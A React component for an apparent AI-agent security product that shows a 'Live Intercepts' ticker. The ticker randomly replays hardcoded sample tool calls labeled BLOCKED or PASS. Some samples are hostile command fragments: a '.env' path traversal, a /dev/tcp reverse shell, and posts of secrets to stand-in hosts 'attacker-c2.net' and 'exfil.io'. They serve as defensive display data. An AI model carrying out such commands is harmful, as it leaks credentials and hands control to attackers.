'use client';

import { useEffect, useRef, useState } from 'react';
import { ShieldAlert, ShieldCheck } from 'lucide-react';

interface ThreatEvent {
  id: number;
  verdict: 'BLOCKED' | 'ALLOWED';
  tool: string;
  client: string;
  gate: string;
  latency: string;
}

const BASE_EVENTS: Omit<ThreatEvent, 'id'>[] = [
  { verdict: 'BLOCKED', tool: 'filesystem.read_file(../../.env)', client: 'Cursor Agent', gate: 'CBAC Gate 2', latency: '1.8µs' },
  { verdict: 'ALLOWED', tool: 'weather.lookup({city:"SF"})', client: 'Claude Desktop', gate: 'Policy Clear', latency: '1.9µs' },
  { verdict: 'BLOCKED', tool: 'network.http_post(attacker-c2.net)', client: 'Windsurf', gate: 'DIFC Taint', latency: '2.4µs' },
  { verdict: 'BLOCKED', tool: 'bash.spawn("bash -i >&/dev/tcp/…")', client: 'LangChain', gate: 'Schema Gate 1', latency: '2.1µs' },
  { verdict: 'ALLOWED', tool: 'filesystem.read_file(src/index.ts)', client: 'Cursor Agent', gate: 'Policy Clear', latency: '2.0µs' },
  { verdict: 'BLOCKED', tool: 'env.AWS_SECRET → exfil.io', client: 'AutoGen', gate: 'DIFC Taint', latency: '3.1µs' },
  { verdict: 'ALLOWED', tool: 'git.log(--oneline -10)', client: 'Windsurf', gate: 'Policy Clear', latency: '1.7µs' },
  { verdict: 'BLOCKED', tool: 'process.spawn("curl", ["-d", secrets])', client: 'Claude Desktop', gate: 'CBAC Gate 2', latency: '1.6µs' },
];

let eventCounter = BASE_EVENTS.length;

function getRandomEvent(): ThreatEvent {
  const base = BASE_EVENTS[Math.floor(Math.random() * BASE_EVENTS.length)];
  return { ...base, id: ++eventCounter };
}

export function LiveThreatTicker() {
  const [events, setEvents] = useState<ThreatEvent[]>(() =>
    BASE_EVENTS.map((e, i) => ({ ...e, id: i }))
  );

  useEffect(() => {
    const interval = setInterval(() => {
      setEvents((prev) => [getRandomEvent(), ...prev.slice(0, 15)]);
    }, 2400);
    return () => clearInterval(interval);
  }, []);

  const displayed = [...events, ...events];

  return (
    <div className="relative w-full border-y border-white/[0.08] bg-[#05070e]/80 backdrop-blur-md py-3 overflow-hidden">
      {/* Left/Right Gradient Fades */}
      <div className="absolute left-0 inset-y-0 w-24 bg-gradient-to-r from-[#030712] to-transparent z-10 pointer-events-none" />
      <div className="absolute right-0 inset-y-0 w-24 bg-gradient-to-l from-[#030712] to-transparent z-10 pointer-events-none" />

      <div className="flex items-center">
        {/* Fixed Title Label */}
        <div className="flex items-center gap-2 pl-4 sm:pl-8 pr-4 shrink-0 z-20 bg-[#05070e]/90">
          <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
          <span className="font-mono text-xs font-bold uppercase tracking-wider text-slate-300">
            Live Intercepts
          </span>
          <span className="text-slate-600">|</span>
        </div>

        {/* Marquee Track */}
        <div className="flex items-center gap-3 overflow-x-hidden animate-marquee whitespace-nowrap">
          {displayed.map((event, idx) => (
            <div
              key={`${event.id}-${idx}`}
              className={`inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-mono border backdrop-blur-sm transition-all ${
                event.verdict === 'BLOCKED'
                  ? 'bg-rose-500/10 border-rose-500/30 text-rose-300'
                  : 'bg-emerald-500/10 border-emerald-500/30 text-emerald-300'
              }`}
            >
              <span
                className={`text-[10px] font-bold px-1.5 py-0.2 rounded ${
                  event.verdict === 'BLOCKED' ? 'bg-rose-500 text-white' : 'bg-emerald-500 text-black'
                }`}
              >
                {event.verdict === 'BLOCKED' ? 'BLOCK' : 'PASS'}
              </span>
              <span className="text-slate-200 font-semibold">{event.tool}</span>
              <span className="text-slate-400 text-[11px]">({event.client})</span>
              <span className="text-amber-400 font-semibold">{event.latency}</span>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}
